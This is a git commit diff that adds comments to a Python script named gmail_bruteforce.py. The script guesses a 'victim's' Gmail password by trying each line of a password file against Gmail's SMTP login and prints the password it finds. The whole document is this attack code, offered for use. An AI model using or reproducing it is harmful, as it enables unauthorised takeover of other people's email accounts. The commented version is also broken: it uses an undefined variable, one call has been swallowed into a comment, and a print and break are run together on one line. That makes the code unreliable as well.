224c3798ff665f4876b6c91b18adf27eea8cc912
Swornim Srestaa <srestaswrnm@gmail.com>
2016-10-19 17:41:46 +0545

    Comments

--- gmail_bruteforce.py
+++ gmail_bruteforce.py
@@ -1,22 +1,17 @@
-import smtplib
+'''Gmail Bruteforce Python Script@creator Swornim Shrestha@email srestaswrnm@gmail.comOct 19 2016 Wed 5:28 PM'''
+import smtplib #importing smtp library
 
-smtpserver = smtplib.SMTP("smtp.gmail.com",587)
-smtpserver.ehlo()
-smtpserver.starttls()
+smtpserver = smtplib.SMTP("smtp.gmail.com",587) #initializationsmtpserver.ehlo() #Ehlo SMTP
+smtpserver.starttls() #Starting TLS
 
-user = input("Enter email address of victim\n >>")
-passfile = input("input the password filename\n >>")
-passwords = open(passfile,"r")
+user = input("Enter email address of victim  >") #Victims Email
+passfile = input("input the password filename\n >>") #Passwords File
+passwords = open(passfile,"r") #Opening the password file
 
+#Foreach lines of password in input file
 for password in passwords:
-	try:
-		smtpserver.login(username,password)
-		print("[+] Password found! %s" % password)
-		break;
-
-	except smtplib.SMTPAuthenticationError:
+	try:#Trying to login and if the password matches.		
+		smtpserver.login(username,password)#Then print the correct password.
+		print("[+] Password found! %s" % password)break; #Break the loop
+	except smtplib.SMTPAuthenticationError:# and if the password is wrong then.
 		print("[!] Password Incorrect %s" % password)
-		
-
-
-
